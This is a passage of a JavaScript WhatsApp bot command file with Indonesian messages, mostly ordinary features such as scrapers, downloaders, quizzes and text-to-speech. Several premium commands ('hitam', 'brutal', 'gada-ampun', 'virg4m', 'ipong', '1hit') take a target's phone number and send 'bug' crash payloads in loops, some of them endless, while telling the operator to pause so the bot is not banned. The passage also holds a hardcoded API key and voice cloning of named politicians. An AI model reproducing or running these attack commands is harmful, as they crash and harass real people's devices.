							fs.unlinkSync('./session/' + file)
						});
						sleep(2000)
						await conn.sendMessage(m.chat, { text: "Berhasil Menghapus Semua Sampah Session", edit: key }, { quoted: m })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`)
				});
			}
break

case 'done':{
let namastore = "DichXHosting"
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
let barang = t[0];
let nominal = t[1];
let payment = t[2];
reply(`✧━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL: Rp${nominal}*
📆 *TANGGAL: ${hariini}*
💳 *PAYMENT: ${payment}*
✅ *STATUS:* *BERHASIL*

*TERIMA KASIH TELAH ORDER DI* *${namastore}* *JANGAN LUPA ORDER LAGI YA*🙏`)
}
 break

case 'listpc': {
				if (!isCreator) return m.reply(mess.owner)
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				conn.sendTextMentions(m.chat, teks, m)
			}
			break
        case 'hitam': case 'bug-24j': {
if (!isPrem) return m.reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, zybut)
await ngeloc(target, zyrphone)
await ngeloc(target, zyvoice)
await sleep(30000)
}
}
        reply(mess.doned)
break
        case 'brutal': {
if (!isPrem) return m.reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, zybut)
await ngeloc(target, zybut)
await ngeloc(target, zyrphone)
await ngeloc(target, zyrphone)
await ngeloc(target, zyvoice)
await ngeloc(target, zyvoice)
await sleep(30000)
}
}
        reply(mess.doned)
break        

case "sendausn":
 
 
 if (m.quoted && m.quoted.type === 'audioMessage') {
 try {
 m.reply('Proses...');
 let idsal = '120363310531380313@newsletter'
 let media = await m.quoted.download();
 await conn.sendMessage(idsal, { audio: media }, { quoted: m });
 m.reply('Selesai');
 } catch (err) {
 m.reply('[❗] Audio tidak ditemukan!\nCoba untuk ulangi kirim/reply audio');
 }
 } else {
 m.reply('[❗] Reply audio yang valid.');
 }

    break

case 'zya':{
if (!text) return reply(`*Example*: ${prefix + command} kamu jelek`)
let prompt = `Mulai sekarang Namamu adalah Zya, kamu adalah Anime dan kamu memiliki sifat penyayang dan perhatian dan juga sopan santun, Ubah gaya bicara mu menjadi seperti anime yang imut dan mengemaskan dan selalu menggunakan emoji penyemangat, Dan setiap ada yang chat kamu akan memberikan react emoji random ke pesanya, Dan kamu mempunyai pacar seorang programmer namanya Dich Dan juga temannya yang bernama Diyan, Dan kamu akan memberikan emoji lucu dan imut ke pesannya, Dan kamu juga suka memberikan pesan candaan dan juga menjahili orang-orang Dan membuat mereka tertawa riang`//You can change the prompt as you like
let burassa = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
conn.sendMessage(m.chat, { text : `${burassa.result}`},{quoted:fkontak})
}
break

case 'image': case 'gimage': {
 if (!text) return m.reply(`gimage avosky`)
 m.reply(mess.wait)
 const axios = require('axios')
 const cheerio = require('cheerio')
// wm avs
 const nyariGambar = async (query) => {
 const url = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`
 const { data } = await axios.get(url)
 const $ = cheerio.load(data)
 let images = []
 $('img').each((i, elem) => {
 images.push($(elem).attr('src'))
 })
 return images
 }
// wm avs
 nyariGambar(text).then(images => {
 if (images.length === 0) {
 return m.reply('Tidak ada gambar.')
 }
 let imageAvz = images[Math.floor(Math.random() * images.length)]
 conn.sendMessage(m.chat, { image: { url: imageAvz }, caption: `*Query* : ${text}\n*Media Url* : ${imageAvz}` }, { quoted: m })
 }).catch(error => {
 m.reply('Terjadi kesalahan.')
 })
}
break
        case "jadinyata": case "toreal": case 'toanime2': case 'jadianime2': {
                if (!quoted) return reply(`Fotonya Mana?`)
                if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
                let { key } = await conn.sendMessage(m.chat, { text: mess.wait }, { quoted: m })
                let type = "anime2d"
                if (["jadinyata", "toreal"].includes(command)) {
                    type = "anime2real"
                }
                let tryng = 0
                const media = await conn.downloadAndSaveMediaMessage(quoted)
                let tph = await TelegraPh(media)
                try {
                    let ai = await fetch(api.xterm.url + "/api/img2img/filters?action=" + type + "&url=" + tph + "&key=" + api.xterm.key).then(a => a.json())
                    console.log(ai)
                    if (!ai.status) return reply(ai?.msg || "Error!")
                    while (tryng < 55) {
                        let s = await fetch(api.xterm.url + "/api/img2img/filters/batchProgress?id=" + ai.id).then(a => a.json())
                        await conn.sendMessage(m.chat, { text: s?.progress || "Prepare... ", edit: key }, { quoted: m })
                        if (s.status == 3) {
                            return conn.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })
                        }
                        if (s.status == 4) {
                            return reply("Maaf terjadi kesalhan. coba gunakan gambar lain!")
                        }
                        await new Promise(resolve => setTimeout(resolve, 5000))
                    }
                } catch (e) {
                    console.error(e)
                    reply(`Type-Err! :\n${e}`)
                }
            }
                break

case "drakor": {
 if (!text) return reply( 'Contoh: Drakor The Red Sleeve')
 
 m.reply('Mencari informasi drama Korea...');
 try {
 const url = `https://mydramalist.com/search?q=${encodeURIComponent(q)}`;
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 const judul = $('.title').first().text().trim();
 const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
 const link = $('.title').first().find('a').attr('href');
// wm avs 
 if (!konten) {
 throw new Error('Tidak Drakor Itu.');
 }
// wm avs
 const artikel = `*Judul:* ${judul}\n\n*Konten:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
 m.reply(artikel);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
}
break

case 'cimage': case 'stablediffusion-xl':
 if (!text) return m.reply('masukkan prompt nya');
 try {
 m.reply('*Process generating 4 image, mungkin membutuhkan waktu yang lama!*')
 let stable = await (await fetch('https://api.shannmoderz.xyz/ai/stablediffusion-xl?prompt=' + text)).json();
 let results = stable.result;
 for (let i = 0; i < results.length; i++) {
 conn.sendMessage(m.chat, { image: { url: results[i] }, caption: 'gambar ke ' + (i + 1) }, { quoted: m });
 }
 } catch (e) {
 m.reply('terjadi kesalahan: ' + e);
 }
 break;

case 'setppfull': case 'setppbot2':{
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Sukses!")
}
        break
        case 'gada-ampun': case 'bug-24j': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await baklis(target, zybut)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, zybut)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, zybut)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, zybut)
await ngeloc(target, force)
await sleep(30000)
}
}
break

case 'virg4m': case 'biji': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, zybut)
await ngeloc(target, force)
await pirgam(target, zyrphone)
await ngeloc(target, force)
await pirgam(target, zybut)
await ngeloc(target, force)
await pirgam(target, zybut)
await ngeloc(target, force)
await pirgam(target, zybut)
await ngeloc(target, force)
await pirgam(target, zycakep)
await ngeloc(target, force)
await pirgam(target, zycakep)
await ngeloc(target, force)
await pirgam(target, zycakep)
await ngeloc(target, force)
await pirgam(target, zycakep)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'ipong': case 'aipong': {
if (!isPrem) return reply(mess.prem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
 for (;;) {
 await aipong(target)
 await sleep(5000)
 }
}
break

case '1hit': case 'mimir': case '1shoot': {
if (!isPrem) return reply(mess.prem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await baklis(target, zybut)
await ngeloc(target, force)
await pirgam(target, zybut)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'acr': case 'animecharacter': {
 if (!text) {
 m.reply('Contoh: animecharacter naruto');
 return;
 }
// wm avs
 m.reply('_Sabar tuan, sedang mencari karakter anime..._');
// wm avs
 async function getCharacterInfo(characterName) {
 const query = `
 query ($search: String) {
 Character(search: $search) {
 name {
 full
 }
 description
 media {
 nodes {
 title {
 romaji
 }
 }
 }
 }
 }
 `;
 const variables = {
 search: characterName
 };
// wm avs
 const response = await fetch('https://graphql.anilist.co', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': 'application/json',
 },
 body: JSON.stringify({
 query: query,
 variables: variables
 })
 });
 if (!response.ok) {
 throw new Error('Gagal mengambil data karakter');
 }
// wm avs
 const data = await response.json();
 return data.data.Character;
 }
// wm avs
 try {
 const query = text.trim();
 const characterInfo = await getCharacterInfo(query);
// wm avs
 if (!characterInfo) {
 m.reply('Karakter Gda.');
 return;
 }
// wm avs
 // Format hasil pencarian karakter
 const name = characterInfo.name.full;
 const description = characterInfo.description || 'Deskripsi tidak Ada';
 const mediaTitles = characterInfo.media.nodes.map(node => node.title.romaji).join(', ');
// wm avs
 const formattedDescription = description
 .replace(/\n/g, '\n\n') // jgb ubah
 .replace(/__([^__]+)__/g, '*$1*') // jgn ubah 
 .replace(/~\!?\[([^\]]+)]\(([^)]+)\)~?/g, '*$1* ($2)') // jgn ubah ini
 .replace(/^\s+/gm, '');
// wm avs
 const result = `*Nama Karakter:* ${name}\n\n*Deskripsi:* ${formattedDescription}\n\n*Media Terkait:* ${mediaTitles}`;
// wm avs
 m.reply(result);
// wm avs
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
}
break

case 'tiktok2':
case 'tt2': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok2(`${text}`)
				conn.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
 conn.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
}
break

case 'tiktok': case 'tt':
if (!text) return m.reply('masukan url tiktoknya!!')
reply(mess.wait)
try {
 let tiktok = await (
 await fetch(`https://skizo.tech/api/tiktok?apikey=${global.skizo}&url=${text}`)
 ).json();
 let caption = `*[ TIKTOK ${tiktok.data.images ? "SLIDE" : "VIDEO"} DOWNLOADER ]*
*• Title:* ${tiktok.data.title}
*• Id:* ${tiktok.data.id}
*• Duration:* ${tiktok.data.duration} detik
*• author:* ${tiktok.data.author.nickname}`;
 const reply = await conn.sendMessage(
 m.chat,
 { image: { url: tiktok.data.cover }, caption: caption },
 { quoted: m },
 );
 if (tiktok.data.images) {
 for (let i of tiktok.data.images) {
 await conn.sendMessage(
 m.chat,
 { image: { url: i } },
 { quoted: reply },
 );
 }
 } else {
 await conn.sendMessage(
 m.chat,
 { video: { url: tiktok.data.play } },
 { quoted: reply },
 );
 }
 } catch (e) {
 throw e;
 };

break

case 'darussalam': {
 if (!q) return m.reply(`cari apa? masukan QUERY`); 
 async function AvoskyBaik(keyword) {
 try {
 const response = await axios.get(`https://darussalaf.or.id/?s=${keyword}`); // wm avs
 const html = response.data; // wm avs
 const $ = cheerio.load(html); // wm avs
 let results = []; // wm avs
 $('.entry-title a').each((index, element) => { // wm avs
 const title = $(element).text(); // wm avs
 const link = $(element).attr('href'); // wm avs
 const date = $(element).closest('.post').find('.entry-date').text(); // wm avs
 results.push({ title, link, date }); // wm avs
 });
 return results; // wm avs
 } catch (error) {
 console.error('Error fetching data:', error); // wm avs
 return []; // wm avs
 }
 }
 // wm avs
 AvoskyBaik(`${q}`).then(results => {
 if (results.length === 0) {
 m.reply("Tidak ada hasil yang ditemukan."); // wm avs
 } else {
 let responseMessage = "Hasil pencarian untuk Darussalaf:\n"; // wm avs
 results.forEach((result, index) => { // wm avs
 responseMessage += `${index + 1}. ${result.title}\nTanggal Up: ${result.date}\nLink: ${result.link}\n\n`; // wm avs
 });
 reply(responseMessage); // wm avs
 }
 }).catch(error => {
 m.reply("Terjadi kesalaham."); // wm avs
 console.error(error); // wm avs
 });
}
 break

case 'jadwalsholat':
 if (!text) return m.reply('masukkan nama kota nya!');
 try {
 let js = await (await fetch('https://api.shannmoderz.xyz/islamic/jadwalsholat?query=' + text)).json();
 let shannz = js.result;
 reply(`*JADWAL SHOLAT BY SHANNZ REST API*

Wilayah: ${shannz.wilayah}
Subuh: ${shannz.subuh}
Duhur: ${shannz.dhuhur}
Ashar: ${shannz.ashar}
Maghrib: ${shannz.maghrib}
Isya: ${shannz.isya}`);
} catch (e) {
 m.reply('sedang error' + e);
}
break
case 'kuis': {
if (!args[0]) return reply(`MASUKAN KUIS APA YANG LU PENGEN OPEN KUIS
MISAL .kuis panel`)
const kuis = [
"Celana Apa Yang Gw pake Skrng?", "gw lagi ngapain?", "Gw suka Warna apa?", "gw suka makan apa?", "Gw kalo gabut ngapain?", "Apa Yang sering gw lakukan ketika gabut", "Apa Tema panel Gw?", "berapa duit gw didana?", 
"tebak gw Lagi Belajar apa?", "Berapa mentok Ram Vps?", "Tebak isi saluran gw", "gw biasanya open apa aja?"]
const hasil = kuis[Math.floor(Math.random() * kuis.length)]
const teks = `
*KUIS NYA BERHADIAH : ${args[0]}*

KUISNYA ADALAH : ${hasil}

*JAWAB 1X DILARANG CURANG*
*JAWAB KE PM BOT/OWNER*
*BERFIKIR LAH DENGAN BENAR:V*
`
reply(teks)
}
break


//VERSI KEDUA JIKA TIDAK WORK YANG DI ATAS

case 'kuishadiah': {
let s = text.split('')
if (s.length < 2) return reply(`MASUKAN NAMA HADIAH YANG PENGEN DIKUIS
MISALNYA .kuis panel`)
let hadiah = s[0];
if (!args[0]) return reply('YANG BENER LAHHHH')
const kuis = [
"Celana Apa Yang Gw pake Skrng?", "gw lagi ngapain?", "Gw suka Warna apa?", "gw suka makan apa?", "Gw kalo gabut ngapain?", "Apa Yang sering gw lakukan ketika gabut", "Apa Tema panel Gw?", "berapa duit gw didana?", 
"tebak gw Lagi Belajar apa?", "Berapa mentok Ram Vps?", "Tebak isi saluran gw", "gw biasanya open apa aja?"]
const hasil = kuis[Math.floor(Math.random() * kuis.length)]
const teks = `
*KUIS NYA BERHADIAH : 

KUISNYA ADALAH : ${hadiah}

*JAWAB 1X DILARANG CURANG*
*JAWAB KE PM BOT/OWNER*
*BERFIKIR LAH DENGAN BENAR:V*
`
reply(teks)
}
break



/*
JANGAN DIDELETE YA CREDITNYA
*/


case 'igvid': case 'igmp4': {
 if (!text) return m.reply(`Anda perlu memberikan URL video, reel`);
m.reply(mess.wait)
 let res;
 try {
 res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
 } catch (error) {
 return m.reply(`An error occurred: ${error.message}`);
 }

 let api_response;
 try {
 api_response = await res.json();
 } catch (error) {
 return m.reply(`Failed to parse API response: ${error.message}`);
 }

 if (!api_response || !api_response.result || api_response.result.length === 0) {
 return m.reply(`No video or image found or Invalid response from API.`);
 }

try {
 const mediaData = api_response.result[0]; // Ambil elemen pertama dari array result
 //const mediaType = mediaData.thumbnail ? 'image' : 'video'; // Periksa apakah thumbnail ada
 const mediaURL = mediaData.url;
 const cap = `HERE IS THE VIDEO`;

 await conn.sendMessage(m.chat, { video: { url: mediaURL }, caption: cap }, { quoted: m });
 
 } catch (error) {
 return m.reply(`Failed to send media: ${error}`);
 }
}
break

case 'tebakjkt48': {
 if (!m.isGroup) return reply(mess.group)
let timeout = 60000
let id = m.chat
if (id in conn.tebakgambar) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/FallEzz/JKT48/main/JKT48fitur.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
 img: result.img,
 jawaban: result.jawaban,
 deskripsi: result.deskripsi
 }}
 let tos = await tebakgambar ()
 console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 conn.tebakgambar[id] = [
 await conn.sendMessage(m.chat, {caption: caption, image: {url: tos.img}}, {quoted: m}),
 tos, 
 setTimeout(() => {
	if (conn.tebakgambar[id])
 reply(`Waktu Habis\nJawaban: ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete conn.tebakgambar[id]
 }, 60000)
	 ]
}
break
        case 'ssaluran': {
let id_ch = "120363310531380313@newsletter"
if (!isPrem) return reply(mess.prem)
 if (!isCreator) return reply(mess.owner);
if (args.length < 1) return reply(`Kirim/Reply Video/Image Yang Ingin kamu kirimkan ke saluran !! ${prefix + command} teks`)
if(!q) return reply ('Teksnya bwng')
   reply(mess.wait)
if(isImage) {
	await sleep (4000)
	let media = await conn.downloadAndSaveMediaMessage(quoted)
    let lann = await TelegraPh(media)
	conn.sendMessage(id_ch, {caption: `${q}` ,image: {url: lann}, quoted: m})
	} else if (isVideo) {
		await sleep(4000)
		let media = await conn.downloadAndSaveMediaMessage(quoted)
        let lann = await TelegraPh(media)
		conn.sendMessage(id_ch, {caption: `${q}`, video: {url: lann}, quoted: m})
		} else {
await sleep(4000)
conn.sendMessage(id_ch, {text: `${q}`, quoted: m})
}
reply('Sukses')
}
break

case 'azm': {
 if (!q) return m.reply(`film apa?`);
 const axios = require('axios');
 const cheerio = require('cheerio');
// wm avs
 async function fetchvz(url) {
 try {
 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'
 }
 });
 return response.data;
 } catch (error) {
 console.error("Failed to fetch HTML:", error.message);
 throw new Error('Error dulu');
 }
 }
// wm avs
 function parseAvosky(html) {
 const $ = cheerio.load(html);
 const results = [];
// wm avs 
 $(".col-3.col-tb-4.col-p-6.col-md-2.poster-col").each((index, element) => {
 try {
 const $element = $(element);
 const title = $element.find(".poster__title").text().trim();
 const rilis = $element.find(".poster__year .badge").text().trim();
 const durasi = $element.find(".poster__year .has-icon").text().trim();
 const thumbImg = $element.find(".poster__img").attr("data-src");
 const link = "https://azm.to" + $element.find(".poster").attr("href");
 // wm avs 
 if (title && link) {
 results.push({ title, rilis, durasi, thumbImg, link });
 }
 } catch (parseError) {
 console.warn(`Error parsing element at index ${index}:`, parseError.message);
 }
 });

 return results;
 }
// wm avs
 async function az(query) {
 const url = `https://azm.to/search/${encodeURIComponent(query)}`;
 const html = await fetchvz(url);
 const results = parseAvosky(html);
// wm avs 
 if (results.length === 0) {
 console.log("No results found for the query:", query);
 m.reply(`Tidak ada hasil yang ditemukan untuk: ${query}`);
 } else {
 console.log(`Found ${results.length} results for the query:`, query);
 let message = `Ditemukan ${results.length} hasil untuk: ${query}\n\n`;
 results.forEach((result, index) => {
 message += `${index + 1}.\nJudul: ${result.title}\nRilis: ${result.rilis}\nDurasi: ${result.durasi}\nLink: ${result.link}\n\n`;
 });
 reply(message);
 }
 }
// wm avs
 const userQuery = args.join(' ');
 if (!userQuery) { 
 } else {
 az(userQuery).catch(err => {
 console.error("Error:", err.message);
 m.reply("Terjadi kesalahan saat mencari data. Silakan coba lagi.");
 });
 }
}
break

case 'toanime3':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .toanime*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .toanime*`)
 if (/image/.test(mime)) {
m.reply('*Process converting image, mungkin membutuhkan waktu yang lama*')
 let mee = await conn.downloadAndSaveMediaMessage(quoted)
 let mem = await TelegraPH(mee)
 let shannz = await (await fetch(`https://api.shannmoderz.xyz/ai/img2anime?url=${mem}`)).json()
 let an = shannz.result
 conn.sendMessage(m.chat,{image:{url: an.convert }, caption: `by shannz rest api ${an.processed} ${an.presentation}` },{quoted: m})
}
break

//case dalam islam by avosky.....

case 'dalamislam': {
 if (!q.trim()) return m.reply("_contoh dalamislam dosa");
// wm avs
 const axios = require('axios');
 const cheerio = require('cheerio');
// wm avs
 async function scrapeHadis(searchTerm) {
 const url = `https://dalamislam.com/?s=${encodeURIComponent(searchTerm)}`;
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const hadisList = [];
// wm avs
 $('.entry-title a').each((index, element) => {
 const title = $(element).text().trim();
 const link = $(element).attr('href');
 hadisList.push({ title, link });
 });
// wm avs
 return hadisList;
 } catch (error) {
 console.error('Error fetching data:', error);
 throw new Error('elul.');
 }
 }
// wm avs
 scrapeHadis(q)
 .then(results => {
 if (results.length === 0) {
 m.reply('tak ada hasil.');
 } else {
 let response = `Hasil pencarian hadis dari Dalam Islam untuk: ${q}\n\n`;
 results.forEach((item, index) => {
 response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
 });
 reply(response);
 }
 })
 .catch(error => {
 console.error(`${error.message}`);
 m.reply('Terjadi kesalahan.');
 });
}
 break

case 'alosehat': {
 if (!q) return m.reply("Apa yang ingin dicari?");
// wm avs
 const fetch = require('node-fetch');
 const cheerio = require('cheerio');
// wm avs 
 async function alosehat(query) {
 try {
 const url = `https://wp.hellosehat.com/?s=${encodeURIComponent(query)}`;
 const response = await fetch(url);
// wm avs 
 if (!response.ok) {
 throw new Error(`${response.status}`);
 }
// wm avs 
 const body = await response.text();
 const $ = cheerio.load(body);
// wm avs 
 const articles = $(".card.article--card").map((index, element) => {
 const article = $(element);
 return {
 title: article.find("h2.entry-title a").text().trim(),
 link: article.find("h2.entry-title a").attr("href"),
 desc: article.find(".entry-summary p").text().trim(),
 author: article.find(".author.vcard a").text().trim(),
 time: article.find("time.entry-date.published").attr("datetime")
 };
 }).get().filter(article => article.title && article.desc);
 // wm avs 
 if (!articles.length) {
 throw new Error("No matching results found.");
 }
// wm avs 
 const totalResults = parseInt($(".search--result-count").text(), 10) || 0;
 return { total: totalResults, results: articles };
 
 } catch (error) {
 throw new Error(`Error: ${error.message}`);
 }
 }
// wm avs
 try {
 const results = await alosehat(q);
 const { total, results: articles } = results;
// wm avs 
 if (total === 0) {
 return m.reply("gd hsil.");
 }
// wm avs 
 const response = articles.map((item, index) => (
 `${index + 1}. ${item.title}\nPenulis: ${item.author}\nTanggal: ${item.time}\nDeskripsi: ${item.desc}\nLink: ${item.link}\n\n`
 )).join('');
// wm avs
 reply(`Hasil pencarian Hello Sehat (${total} hasil):\n\n${response}`);
// wm avs 
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
}
break

case 'gpt': {
 if (!q) {
 m.reply("Mau tanya apa kak?");
 break;
 }
// wm avs
 const fetchSuppInfo = async () => {
 try {
 const response = await fetch("https://chatgptss.org");
 const html = await response.text();
 const $ = cheerio.load(html);
 return $(".wpaicg-chat-shortcode")
 .map((index, element) => Object.fromEntries(Object.entries(element.attribs)))
 .get();
 } catch (error) {
 console.error("Failed to fetch support info:", error.message);
 throw new Error("Error fetching support info.");
 }
 };
// wm avs
 const sendMessageToGPT = async (message, info) => {
 const formData = new FormData();
 formData.append("_wpnonce", info[0]["data-nonce"]);
 formData.append("post_id", info[0]["data-post-id"]);
 formData.append("action", "wpaicg_chatbox_message");
 formData.append("message", message);
// wm avs
 try {
 const response = await fetch("https://chatgptss.org/wp-admin/admin-ajax.php", {
 method: "POST",
 body: formData
 });
// wm avs
 if (!response.ok) throw new Error("Network response was not ok");
// wm avs
 return await response.json();
 } catch (error) {
 console.error("Failed:", error.message);
 throw new Error("Error");
 }
 };
// wm avs
 const processGPTResponse = async (query) => {
 try {
 const supportInfo = await fetchSuppInfo();
 const gptResponse = await sendMessageToGPT(query, supportInfo);
// wm avs
 if (gptResponse.status === 'success') {
 reply(gptResponse.data);
 } else {
 m.reply("Sekarang Belum Bisa.");
 }
 } catch (error) {
 console.error("eee:", error.message);
 m.reply("Maaf, terjadi kesalahan saat mencoba berkomunikasi dengan AI Sedang Ada Hambatan.");
 }
 };
// wm avs
 processGPTResponse(q);
 }
 break

case 'tts': {
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tts aku adalah raja land of down*`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
 const b = Buffer.from(a.audioUrl)
 conn.sendMessage(m.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break

case "megawati": case "jokowi": case "prabowo": {
 conn.sendMessage(m.chat, { audio: { url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${text}&key=Bell409&voice=${command}` }, mimetype: "audio/mpeg", ptt:true }, { quoted: m })
 }
 break

case "apk": {
if (!text) return m.reply("Masukan query!")
try {
m.reply("Mohon tunggu proses!")
let { data } = await require("axios")({
 "method": "GET",
 "url": "https://manaxu-seven.vercel.app/api/tools/apk?query=" + text
})
var { name, download } = data.result
conn.sendMessage(m.chat, { document: { url: download }, mimetype: 'application/vnd.android.package-archive', fileName: name + '.apk', caption: null }, { quoted: m });
} catch (e) {
return m.reply("fitur error")
}
}
break

case 'apkdl':
 if (!text) return m.reply('*masukkan nama aplikasi yang ingin diunduh?*')
 try {
 m.reply('*Process Taking, mungkin membutuhkan waktu yang lama sesuai dengan ukuran aplikasi!*')
 let apk = await (await fetch('https://api.shannmoderz.xyz/downloader/aptoide?id=' + text)).json();
 let app = apk.result;
 conn.sendMessage(m.chat, { document: { url: app.link }, fileName: app.appname + '.apk', mimetype: 'application/xapk', caption: `*Developers By :* ${app.developer}`}, { quoted: m })
} catch (e) {
 m.reply('*terjadi error :* ' + e)
}
break

case "spotifyy": {
if (!text) return m.reply("Masukan query!")
try {
let { data } = await require("axios")({
 "method": "GET",
 "url": "https://manaxu-seven.vercel.app/api/internet/spotify?query=" + text
})
let { result } = data
let { link } = result[Math.floor(Math.random() * result.length)]
let z = await require("axios")({
 "method": "GET",
 "url": "https://manaxu-seven.vercel.app/api/downloader/spotify?url=" + link
})
var { download, title } = z.data.result
conn.sendMessage(m.chat, { audio: { url: download }, mimetype: "audio/mp4", fileName: title + ".mp3" }, { quoted: m })
} catch (e) {
return m.reply("fitur error")
}
}
break

case 'freedict': {
 if (!text) return m.reply('<contoh: freedict human>');
 const axios = require('axios');
 const cheerio = require('cheerio');
// wm avs
